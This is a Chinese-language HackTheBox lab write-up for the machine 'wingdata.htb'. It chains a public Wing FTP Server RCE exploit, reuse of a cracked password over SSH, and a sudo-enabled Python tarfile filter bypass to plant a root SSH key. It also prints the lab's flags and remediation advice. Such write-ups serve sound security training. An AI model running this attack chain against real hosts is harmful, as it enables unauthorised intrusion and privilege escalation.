---
title: "wingdata.htb"
ctf: "HackTheBox"
date: 2026-04-29
category: linux
difficulty: medium
points: 300
flag_format: "flag{...}"
author: anonymouse
---

# wingdata.htb

## Summary

通过 Wing FTP Server 未授权 RCE (CVE-2025-47812) 获取初始 shell，密码复用横向移动至 wacky 用户，最后利用 sudo 权限配合 Python tarfile filter bypass (CVE-2025-4138) 提权至 root。

## Solution

### Step 1: 端口扫描与服务识别

```bash
nmap -sC -sV -p- 10.129.26.75
```

发现开放端口：

| Port | Service | 版本 |
|------|---------|------|
| 22 | SSH | OpenSSH 9.2p1 |
| 80 | HTTP | nginx |
| 443 | HTTPS | Wing FTP Server 7.4.3 |
| 8080 | HTTP | Wing FTP Server Web UI |

### Step 2: Wing FTP Server 未授权 RCE

识别到 Wing FTP Server v7.4.3，对应 **CVE-2025-47812** (CVSS 10.0)，可未认证代码执行。

```bash
# 下载并执行公开 PoC
git clone https://github.com/...

# 反弹 shell
python3 exploit.py --target ftp.wingdata.htb --port 443 --proto https
```

获得 `wingftp` 用户 shell (uid=1000)。

### Step 3: 横向移动 - Web Admin 密码复用

从 wingftp shell 找到 Web Admin 界面的 cracked hash：

```
admin hash → Password: !#7Blushing^*Bride5
```

密码复用至 wacky 用户：

```bash
ssh wacky@10.129.26.75
# Password: !#7Blushing^*Bride5
```

获取 user.txt：

```bash
cat /home/wacky/user.txt
flag{385db33c71ed28594081a9e9b64d5c10}
```

### Step 4: 权限提升 - tarfile filter bypass

检查 sudo 权限：

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

脚本使用 `tar.extractall()` 且有 `filter="data"` 安全检查，但可通过 **CVE-2025-4138** PATH_MAX truncation 绕过：

1. 构造超长 symlink 链使路径超过 4096 bytes
2. 安全检查通过，但实际写入触发 OS 层路径解析
3. 可写任意文件到任意位置

```bash
# 生成恶意 tar
python3 /tmp/exploit_tar.py -o /tmp/backup_1001.tar -p ssh-key -P ~/.ssh/id_rsa.pub

# 上传并触发
scp /tmp/backup_1001.tar wacky@10.129.26.75:/opt/backup_clients/backups/backup_1001.tar
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_cve

# SSH 登录 root
ssh -i ~/.ssh/id_rsa root@10.129.26.75
```

获取 root.txt：

```bash
cat /root/root.txt
flag{a1f430cc9a28c09807278b6499f424ac}
```

## 完整攻击链

```
端口扫描 (22,80,443,8080)
  ↓
Wing FTP Server 7.4.3 (CVE-2025-47812) → wingftp shell
  ↓
Web Admin 密码复用 → wacky SSH 登录
  ↓
sudo /usr/local/bin/python3 restore_backup_clients.py *
  ↓
CVE-2025-4138 PATH_MAX bypass → /root/.ssh/authorized_keys 写入
  ↓
ssh -i id_rsa root@10.129.26.75 → root shell
```

## 修复建议

1. **Wing FTP Server**: 升级至 7.4.4+ (修复 CVE-2025-47812)
2. **Python tarfile**: 避免使用 `extractall()`，使用 `extract()` 并手动校验路径
3. **sudo 规则**: 限制 restore_backup_clients.py 的参数，避免任意文件还原
4. **SSH**: 禁止密码登录，使用 key-based auth + 强密码策略

## Flag

```
flag{385db33c71ed28594081a9e9b64d5c10}  # user
flag{a1f430cc9a28c09807278b6499f424ac}  # root
```